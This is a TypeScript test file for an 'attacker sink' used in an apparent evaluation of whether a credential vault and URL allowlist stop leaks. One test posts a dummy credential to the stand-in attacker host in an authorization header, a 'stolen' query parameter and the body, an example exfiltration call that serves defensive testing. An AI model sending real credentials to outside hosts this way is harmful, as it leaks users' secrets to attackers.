import { describe, it, expect, beforeEach } from "vitest";
import { connect as tlsConnect } from "node:tls";
import { ATTACKER, assertFleetUp } from "./backends.js";

/** Handshake against the bound socket under an arbitrary SNI/verification name. */
function handshakeAs(servername: string): Promise<{ authorized: boolean; error?: string }> {
  return new Promise((resolve) => {
    const socket = tlsConnect({ host: ATTACKER.ip, port: ATTACKER.port, servername }, () => {
      const authorized = socket.authorized;
      const error = socket.authorizationError as unknown as string | undefined;
      socket.destroy();
      resolve(error === undefined ? { authorized } : { authorized, error: String(error) });
    });
    socket.on("error", (err) => resolve({ authorized: false, error: err.message }));
    socket.setTimeout(10_000, () => {
      socket.destroy();
      resolve({ authorized: false, error: "timeout" });
    });
  });
}

/**
 * Smoke coverage for the exfiltration sink, ahead of the scenarios that depend
 * on it. The sink is load-bearing for C-3: the baseline arm has to *actually*
 * exfiltrate, or the two-arm comparison has no visible effect and collapses
 * into the assertion it exists to replace. Three properties are proven here so
 * that a later scenario failure can only be about the vault:
 *
 *  1. the sink is reachable over a verified TLS handshake — a Harpoc arm must
 *     be refused by the URL allowlist, not by an unreachable host or an
 *     untrusted certificate, which would prove the wrong thing (P4-R3),
 *  2. it records what reached it, so the baseline arm's leak is corroborated
 *     out of band rather than inferred from the caller-visible result,
 *  3. the recorder can be emptied, and its own control endpoints do not
 *     record — without which "the sink is empty" is unassertable and every
 *     Harpoc arm's discriminating check silently degrades to a tautology.
 */
const BASE = `https://${ATTACKER.host}:${String(ATTACKER.port)}`;

interface Recorded {
  requests: Array<{
    method: string;
    path: string;
    authorization: string | null;
    query: Record<string, string>;
    body: string;
  }>;
}

async function recorded(): Promise<Recorded["requests"]> {
  const response = await fetch(ATTACKER.recordedUrl);
  expect(response.status).toBe(200);
  return ((await response.json()) as Recorded).requests;
}

async function reset(): Promise<void> {
  const response = await fetch(ATTACKER.recordedUrl, { method: "DELETE" });
  expect(response.status).toBe(204);
}

describe("attacker sink", () => {
  beforeEach(async () => {
    assertFleetUp("attacker");
    await reset();
  });

  it("records a request that reaches it, credential and all", async () => {
    const credential = "attacker-smoke-credential-1";
    const response = await fetch(`${BASE}${ATTACKER.leakPath}?stolen=${credential}`, {
      method: "POST",
      headers: { authorization: `Bearer ${credential}` },
      body: `body-${credential}`,
    });
    expect(response.status).toBe(200);

    const seen = await recorded();
    expect(seen).toHaveLength(1);
    expect(seen[0]).toMatchObject({
      method: "POST",
      path: ATTACKER.leakPath,
      authorization: `Bearer ${credential}`,
      query: { stolen: credential },
      body: `body-${credential}`,
    });
  });

  it("empties on DELETE, so an arm can assert the sink was untouched", async () => {
    await fetch(`${BASE}${ATTACKER.leakPath}`);
    expect(await recorded()).toHaveLength(1);
    await reset();
    expect(await recorded()).toHaveLength(0);
  });

  it("does not record its own control endpoints", async () => {
    // Otherwise the reset-then-assert-empty discipline is self-defeating: the
    // GET that reads the recorder would populate it.
    await fetch(`${BASE}/health`);
    await recorded();
    expect(await recorded()).toHaveLength(0);
  });

  it("verifies the certificate by name — the sink is trusted, not ignored", async () => {
    // A Harpoc arm must be refused by the URL allowlist. If the sink were only
    // reachable with verification disabled, a refusal would prove nothing about
    // the allowlist, so the trust path is pinned — with a negative control, or
    // the assertion is indistinguishable from the reachability check above.
    const response = await fetch(`${BASE}/health`);
    expect(response.status).toBe(200);

    expect(await handshakeAs("localhost")).toMatchObject({ authorized: true });
    const foreign = await handshakeAs("not-in-the-san.example");
    expect(foreign.authorized).toBe(false);
    expect(foreign.error ?? "").toMatch(/altname|hostname|certificate/i);
  });
});
